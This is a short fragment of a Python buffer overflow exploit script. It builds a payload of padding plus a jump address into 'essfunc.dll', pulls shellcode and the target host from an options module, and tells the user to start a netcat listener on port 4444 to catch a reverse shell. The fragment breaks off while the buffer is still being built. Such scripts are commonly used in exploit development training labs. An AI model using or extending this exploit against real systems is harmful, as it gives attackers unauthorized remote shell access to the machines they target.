...
import socket
from options import HOST, PORT, SHELLCODE_OFFSET, ESSFUNC_DLL_JMP_LOCATIONS_INTS_BIG_ENDIAN, NOP, SHELLCODE

print("Run 'nc -nlvp 4444' to connect to the reverse shell :)")

buf = ('A' * SHELLCODE_OFFSET)
buf += ESSFUNC_DLL_JMP_LOCATIONS_INTS_BIG_ENDIAN[0]  # location of a DLL we can inject into
